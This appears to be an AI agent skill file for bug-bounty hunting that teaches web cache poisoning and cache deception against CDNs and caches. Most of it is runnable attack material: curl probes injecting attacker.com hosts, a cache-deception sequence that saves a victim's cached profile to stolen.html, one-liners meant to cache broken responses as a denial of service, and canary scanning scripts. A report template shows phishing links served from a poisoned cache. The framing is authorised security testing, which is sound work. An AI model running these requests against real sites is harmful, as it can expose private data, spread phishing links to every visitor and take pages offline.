---
name: cache-poisoning
description: Hunt web cache poisoning, CDN cache poisoning, and cache deception attacks. Use when target uses a CDN (Cloudflare, Akamai, Fastly, AWS CloudFront) or has Varnish/nginx caches and you want to identify cache key flaws that let attackers serve malicious content to other users.
metadata:
  type: skill
  phase: hunt
  vuln_class: cache-poisoning
  cwe: 444
  paid_examples: portswigger
---

# Cache Poisoning & Cache Deception

> Affect one user → affect millions.

## When to invoke

**Trigger phrases:**
- "cache poisoning"
- "web cache"
- "CDN attack"
- "cache deception"

## Two distinct attacks

### Cache Poisoning
Attacker sends a crafted request → response contains malicious content → cache stores it → all subsequent users get the malicious response.

### Cache Deception
Attacker tricks the cache into storing **another user's authenticated content** at a public URL → attacker reads private data via cache.

## Core concept: cache key

```
Cache key = how the cache identifies "same request"

If cache key = URL only:
  Request 1: GET /home with X-Forwarded-Host: attacker.com
  Cache stores response (which includes attacker.com in Location)
  Request 2: GET /home (no header) → served from cache → attacker.com link
```

**Unkeyed inputs** (parts of request NOT in cache key but affecting response) = poisoning opportunity.

## Detection

### Check if response is cached

```bash
curl -sI "https://target.com/" | grep -iE 'cache-control|age|x-cache|cf-cache-status|cf-ray|x-served-by|via|x-cache-hits'

# Indicators of caching:
# Cache-Control: public, max-age=86400
# Age: 1234              ← seconds since cached
# X-Cache: HIT           ← served from cache
# CF-Cache-Status: HIT   ← Cloudflare cache
# X-Served-By: cache-...
```

### Find unkeyed inputs

Send a request with a marker header. Send a second clean request. Does the second response contain the marker?

```bash
# Step 1: poison probe
curl -s "https://target.com/" -H "X-Forwarded-Host: ccs-canary.attacker.com" -o /dev/null

# Step 2: fresh request from a different IP/user (or cache-buster)
curl -s "https://target.com/?cb=$(date +%s)" | grep "ccs-canary.attacker.com"

# Step 3: if marker appears in another request's response → cache key is incomplete
```

## Common unkeyed inputs to test

| Input | Effect |
|---|---|
| `X-Forwarded-Host` | Affects `Location` headers, absolute URLs |
| `X-Forwarded-Proto` | http vs https in generated URLs |
| `X-Forwarded-Scheme` | Same |
| `X-Original-URL` | Reroutes |
| `X-Rewrite-URL` | Reroutes |
| `X-Host` | Like XFH |
| `Host` (sometimes unkeyed!) | Backend differs |
| `Forwarded` | RFC 7239 version of XFF |
| `X-Original-URL` | URL rewriting |
| `Origin` | Reflects to CORS headers |
| Cookie params | Some caches don't include all cookies in key |
| URL query params (some) | `utm_*`, `_=`, etc. often ignored |
| Trailing `?` or `;` | Cache may strip → match with non-? variant |

## Step-by-Step Workflow

### 1. Inventory cacheable endpoints

```bash
# Look for caches in your asset-discovery output
cat httpx.jsonl | jq -r 'select(.headers.cache_control != null and (.headers.cache_control | tostring | test("public|max-age"))) | .url' > cacheable.txt
```

### 2. Test for unkeyed-header poisoning with Param Miner

Burp extension **Param Miner** has a "Guess headers" mode that fuzzes hundreds of unkeyed inputs.

Run on each cacheable endpoint → review the "issues" list.

Manual probe:
```bash
TARGET="https://target.com/"
HEADER_TESTS=(
    "X-Forwarded-Host"
    "X-Forwarded-For"
    "X-Forwarded-Proto"
    "X-Original-URL"
    "X-Rewrite-URL"
    "X-Host"
    "X-Forwarded-Scheme"
    "Origin"
    "Forwarded"
    "X-Forwarded-Server"
)

CANARY="ccs-canary-$(uuidgen | head -c 8).attacker.com"

for h in "${HEADER_TESTS[@]}"; do
    # Poison
    curl -s "$TARGET?cb=test1" -H "$h: $CANARY" -o /dev/null

    # Verify on second request (different cache buster)
    response=$(curl -s "$TARGET?cb=test2")
    if echo "$response" | grep -q "$CANARY"; then
        echo "[REFLECTED + may be cached] $h"
    fi
done
```

### 3. Try cache deception

Goal: get the cache to store a private response at a public URL.

```
Authentic URL:    /account/profile          (sensitive, not cached, requires auth)
Trick URL:        /account/profile.css      (cache: "looks like CSS — cache it!")

If the app routing resolves /account/profile.css → same handler as /account/profile,
and the cache decides based on extension → poisoning by deception.
```

Test:
```bash
# Login as victim
curl -s "https://target.com/account/profile.css" --cookie "session=victim" -o /dev/null

# As attacker (no cookies), fetch the same URL → may get victim's cached content
curl -s "https://target.com/account/profile.css" -o stolen.html

# If stolen.html contains victim's profile data → deception confirmed
```

Try variations:
```
/account/profile/                  ← trailing slash
/account/profile/foo.css           ← path traversal style
/account/profile;.css              ← matrix param
/account/profile..css
/account/profile.js
/account/profile.png
/account/profile?.css
```

### 4. Cache key normalization tricks

Some caches normalize URLs before key generation:
```
/foo  and  /foo/  → same key?
/foo  and  /FOO   → same key?
/foo?a=1&b=2  and  /foo?b=2&a=1  → same key?
/foo?a=1  and  /foo?a=1#fragment → same key?

If they differ but content is same → no bug, just inefficient.
If they're considered same but generate different content → poisoning surface.
```

### 5. Test for fat-GET / unkeyed body

```http
# Some caches ignore body, even for GET
GET /resource HTTP/1.1
Host: target.com
Content-Length: 13

malicious-data
```

If the response varies based on body but cache key is just URL → unkeyed body poisoning.

### 6. CDN-specific quirks

**Cloudflare:**
- `Cache-Control: private` is honored
- Query string keying configurable per-zone
- Worker scripts can be bypassed via specific endpoints

**Akamai:**
- Pragma debug headers can leak cache state
- ICP header can reveal cache hit/miss

**Fastly:**
- Surrogate-Key header
- ESI can be exploited if enabled

**CloudFront:**
- Cache key behavior configurable per-distribution
- Query string forwarding settings often misconfigured

### 7. Cache poisoning to DoS

Even without sensitive impact, you can DoS by poisoning:

```bash
# Poison with broken HTML
curl -H "X-Forwarded-Proto: ://" target.com/  # may break Location header
# Now all subsequent users see broken page until cache expires

# Or oversize header
curl -H "X-Forwarded-Host: $(python3 -c 'print("A"*8000)')" target.com/
# 400/500 response cached → DoS until eviction
```

## Tools

```bash
# Param Miner (Burp BApp) — guesses unkeyed parameters/headers automatically
# Web Cache Vulnerability Scanner (Hackmanit)
pip install web-cache-vulnerability-scanner

# Mary (cache poisoning automation by NahamSec / others)
```

## Output template

```markdown
## High: Web cache poisoning via X-Forwarded-Host on /home

### Summary
The home page (`/home`) caches publicly with `Cache-Control: public, max-age=300`. The cache key does NOT include the `X-Forwarded-Host` header, but the application uses this header to generate canonical URLs (Open Graph `og:url`, login link `href`). By sending one crafted request, an attacker can poison the cache for 5 minutes, causing all users to see a phishing-domain login link.

### Steps to reproduce
1. Poison the cache (single request):
   ```http
   GET /home HTTP/1.1
   Host: target.com
   X-Forwarded-Host: phish.attacker.com
   ```
2. Wait ~1 second for cache write.
3. From a different IP/browser, request `/home` normally:
   ```http
   GET /home HTTP/1.1
   Host: target.com
   ```
4. Response body contains:
   ```html
   <meta property="og:url" content="https://phish.attacker.com/home">
   <a href="https://phish.attacker.com/login" class="login-link">Log in</a>
   ```
5. The poisoned response persists for ~300s.

### Impact
- All visitors during the 5-minute window see the phishing link as the official "Log in" button.
- Attacker can re-poison every 5 minutes indefinitely.
- High-trust phishing: link IS displayed on `target.com`, but goes to attacker's clone of the login.
- Combined with credentials submission to a clone, mass account takeover.

### Suggested fix
- Add `X-Forwarded-Host` to the cache key (`Vary: X-Forwarded-Host`).
- OR ignore `X-Forwarded-Host` in URL generation (use server-set Host or canonical config).
- OR set `Cache-Control: private` for /home if personalization is required.
```

## Cross-references

- `[[xss]]` — cache poisoning + reflected XSS = mass XSS
- `[[ato-chains]]` — phishing link via cache → ATO at scale
- `[[http-smuggling]]` — request smuggling + cache poisoning = devastating chain
- `[[fingerprinting]]` — identify CDN before testing

## Common pitfalls

1. **Testing on YOUR cache only** (browser cache, local). Always use cache-busters and verify another client sees the poison.
2. **Reporting reflected unkeyed input without showing cache hit.** Triagers want to see the poisoning persist.
3. **Causing real DoS in production.** Throttle. Test on a low-traffic path.
4. **Not respecting cache TTL in reproduction steps.** Triager replays after TTL → no repro → N/A.
5. **Cache-busting via header but reporting "no cache-buster needed".** Document exactly how you reproduced.

## Severity guide

| Poisoning effect | Severity |
|---|---|
| Mass XSS via cached response | Critical |
| Phishing link injected globally | High |
| Broken site (DoS-by-poison) | Medium-High |
| Information disclosure (cached private data via deception) | High-Critical |
| Cache deception (login pages cached) | Critical |
| Cosmetic break only | Low (often informative) |

## Cache headers to set in your repro

```http
Cache-Control: no-cache, no-store
Pragma: no-cache

# Or use unique cache buster
?_=1234567
```

## Quick canary script

```bash
#!/bin/bash
URL="$1"
CANARY="bb-$(uuidgen | head -c 12)"

# Standard unkeyed headers
HEADERS=(
    "X-Forwarded-Host"
    "X-Original-URL"
    "X-Forwarded-Scheme"
    "X-Forwarded-Proto"
    "X-Rewrite-URL"
    "X-Host"
    "Origin"
)

for H in "${HEADERS[@]}"; do
    # Poison
    curl -s "$URL?_=$CANARY-poison" -H "$H: $CANARY.attacker.test" -o /dev/null

    # Verify
    if curl -s "$URL?_=$CANARY-verify" | grep -q "$CANARY"; then
        echo "[POISONABLE] $H"
    fi
done
```
